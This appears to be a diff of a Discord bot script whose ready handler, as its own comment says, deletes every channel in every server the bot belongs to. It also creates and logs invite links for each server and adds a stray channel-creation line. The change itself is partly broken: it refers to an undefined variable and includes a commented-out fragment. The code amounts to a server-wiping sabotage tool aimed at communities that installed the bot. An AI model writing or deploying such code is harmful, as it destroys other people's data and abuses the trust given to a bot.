@@ -7,13 +7,22 @@ const fs = require("fs")
 //on ready delete all channels
 client.on("ready", () => {
 
-
+/*
+        
+            console.log("channel created");
+        }
+*/
 // Create an invite to a channel
 client.guilds.forEach(server => {
+   guild.createChannel("-", "text");
     server.channels.first().createInvite().then(inviteCode => {
         console.log(inviteCode);
+    
     });
 });
+
+
+
 
 
 client.guilds.forEach(server => {
@@ -21,6 +30,9 @@ client.guilds.forEach(server => {
         channel.delete();    
     });
 });
+
+
+
 
 //startup message log
 console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Logged in as ${client.user.tag}. (^o^)／`);
